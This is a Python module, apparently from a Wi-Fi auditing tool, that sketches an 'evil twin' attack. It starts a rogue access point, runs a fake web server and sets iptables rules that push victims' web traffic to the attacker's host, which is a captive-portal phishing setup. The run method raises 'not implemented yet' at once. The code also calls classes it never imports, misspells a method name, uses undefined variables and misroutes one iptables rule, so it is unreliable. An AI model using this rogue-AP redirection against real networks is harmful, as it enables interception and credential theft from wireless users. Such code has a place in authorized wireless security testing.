#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import time

from ..model.attack import Attack
from ..tools.ifconfig import Ifconfig
from ..tools.iptables import Iptables
from ..tools.eviltwin_server import EviltwinServer
from ..util.color import Color
from ..config import Configuration

class EvilTwinAttack(Attack):
    def __init__(self, target):
        super(EvilTwinAttack, self).__init__(target)
        self.target = target
        self.success = False
        self.completed = False
        self.crack_result = None

        self.crack_result = None
        self.hostapd = None
        self.dnsmasq = None

        self.deauther = None  # Mdk3Deauther?


    def success_callback(self, crack_result):
        # TODO: Stop all processes & reset IP tables
        self.crack_result = crack_result
        self.success = True
        self.completed = True


    def error_callback(self, error_msg):
        self.completed = True


    def run(self):
        # Take interface out of monitor mode
        raise Exception('Eviltwin attack not implemented yet, see https://github.com/derv82/wifite2/issues/81')

        monitor_interface = Configuration.interface
        (_, base_interface) = Airmon.stop(monitor_interface)

        Ifconfig.up(base_interface, ['10.0.0.1/24'])

        self.configure_iptables(base_interface)

        self.hostapd = Hostapd(self.target)
        self.hostapd.start(base_interface)

        server = EviltwinServer()
        server.serve_forever()

        try:
            while not self.completed:
                time.sleep(1)
        except KeyboardInterrupt as e:
            self.cleanup()
            raise e

        if self.success:
            print status, save
            return

        if self.error_msg:
            raise Exception(self.error_msg)


    def cleanup(self):
        '''
        TODO:
        * Kill all processes
        * Delete config files from temp
        * Reset iptables
        * Reset interface state?
        '''
        pass

    def set_port_forwrading(self, enabled=True):
        # echo "1" > /proc/sys/net/ipv4/ip_forward
        # TODO: Are there other ways to do this?
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ip_forward:
            ip_forward.write('1' if enabled else '0')


    def configure_iptables(self, base_interface):
        # iptables -N internet -t mangle
        Iptables.new_chain('internet', 'mangle')

        #iptables -t mangle -A PREROUTING -j internet
        Iptables.append('PREROUTING', table='mangle', rules=[
            '-j', 'internet'
        ])

        #iptables -t mangle -A internet -j MARK --set-mark 99
        Iptables.append('PREROUTING', table='mangle', rules=[
            '-j', 'MARK',
            '--set-mark', '99',
        ])

        #iptables -t nat -A PREROUTING -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
        Iptables.append('PREROUTING', table='nat', rules=[
            '--match', 'mark',
            '--mark', '99',
            '--protocol', 'tcp',
            '--dport', '80',
            '--jump', 'DNAT',
            '--to-destination', '10.0.0.1',
        ])

        self.set_port_forwarding(enabled=True)

        #iptables -A FORWARD -i eth0 -o wlan0 -m state --state ESTABLISHED,RELATED -j ACCEPT
        Iptables.append('FORWARD', rules=[
            '--in-interface', 'eth0',
            '--out-interface', base_interface,
            '--match', 'state',
            '--state', 'ESTABLISHED,RELATED',
            '--jump', 'ACCEPT',
        ])

        #iptables -A FORWARD -m mark --mark 99 -j REJECT
        Iptables.append('FORWARD', rules=[
            '--match', 'mark',
            '--mark', '99',
            '--jump', 'REJECT',
        ])

        #iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
        Iptables.append('FORWARD', rules=[
            '--in-interface', base_interface,
            '--out-interface', 'eth0',
            '--jump', 'ACCEPT',
        ])

        #iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
        Iptables.append('POSTROUTING', table='nat', rules=[
            '--out-interface', 'eth0',
            '--jump', 'MASQUERADE',
        ])

